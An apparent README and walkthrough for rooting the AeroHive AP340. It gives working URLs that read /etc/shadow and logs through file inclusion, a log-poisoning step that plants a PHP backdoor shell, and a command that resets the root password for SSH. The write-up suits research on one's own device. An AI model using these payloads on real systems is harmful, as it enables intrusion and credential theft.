# aerohive-ap340-root
Python script to change the root password on the AeroHive AP340 with HiveOS < 6.1R5
The result is direct root command line access via /bin/sh rather than the locked down AH CLI.

Usage:
> python3 ap340-exploit.py

## Dependencies
Python3
Urllib

## Recon

I first set about to try and root this device with the hopes of building/installing something like
OpenWrt on it. I have yet to accomplish that as of yet, but I did manage to gain root access via SSH
allowing me to bypass the ah_cli "jail" shell.

As a start, I downgraded the firmware of my AP340 by using the ah_cli to boot into the backup partition which
happened to have an older firmware version. Here the thinking was that I would maximize my chances at finding
an exploitable vuln by having it as out of date as possible.

To start, I did some open source recon and found the following vulnerability listing on exploit-db:

https://www.exploit-db.com/exploits/34038/

"Aerohive version 5.1r5 through 6.1r5 contain two vulnerabilities, one reflective XSS vulnerability and a **limited local file inclusion vulnerability (I was only able to view source from one specific folder, *maybe you can leverage this further)***. 
It's possible earlier version are affected, I was only able to review 5.1r5 briefly, the vendor indicated other version up to 6.1r5 are vulnerable as well."

## Exploitation
Of particular interest was the LFI vulnerability and the tantalizing "maybe you can leverage this further."
With every intent to leverage this further, I tested the example LFI from the exploit-db page:

> http://<IP>/action.php5?_action=get&_actionType=1&_page=php://filter/convert.base64-encode/resource=ManagementAP

This returned the ManagementAP PHP page as promised. Great!
The only problem was that the web server was appending ".php" to any other file that we tried to read.
We can fix this by adding a null byte "%00" to the end of the filename since the web server is running 
an old version of PHP.

Now we can read arbitrary files like /etc/passwd with:
> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../etc/passwd%00

We can also see the shadow file with:
> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../etc/shadow%00

Great! The web server is running as a privileged user. I tried cracking the hashes for around 30 minutes with John to no avail.
Your mileage may vary. In any case, this was a dead end that I put off till later if I couldn't find another way in.

## Post Exploitation
We can also see the system boot/error logs with:
> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00

After reading /var/log/messages I noticed that it was logging usernames with something like:

"Failed login for user <username>"

I then read up on some techniques for escalating LFI to RCE and came upon this article:

http://www.hackingarticles.in/exploit-webserver-log-injection-lfi/

I then tested some inputs on the username field of the login for the web server and eventually, the 
/var/log/messages file presented me with a syntax error after entering <?php blah as input.

Success! The web server is interpreting the php tags and throwing errors since I didn't provide valid PHP.
The down side was that I now had a broken /var/log/messages file. A simple reboot and the logs rotated with fresh
data and we were back up and running.

I then pasted a simple PHP command shell into the username field of the web form login.
I used this one: http://snipplr.com/view/72936/simple-php-backdoor-shell/

I entered gibberish as the password, then hit enter.

Browsing to the LFI for /var/log/messages again with the following URL and ...
> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=whoami

Viewing source for the page and searching for "whoami" and we see that it worked! The web server process is running as the root user.

## Privilege Escalation

Now, how to get a reverse shell? There are lots of methods out there for running netcat, telnet, fifo shells, etc.
I chose to go the simple route and just reset the root SSH password with:

> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=echo+root:password+|+/usr/sbin/chpasswd

http://imgur.com/9InNHHi

Will change the root password for SSH to "password"

Then logging in with user root and password "password", we get a root shell!

If anyone has any suggestions for building/flashing the device with something like Tomato or OpenWrt, please let me know with an issue request/pull request, etc.

tl;dr the steps are as follows:

1. Poison the log file in /var/log/messages by injecting PHP code into the username field of the login page
2. Call the uploaded PHP shell with the LFI URL, changing the root password for SSH
3. Login with SSH as root using password "password"
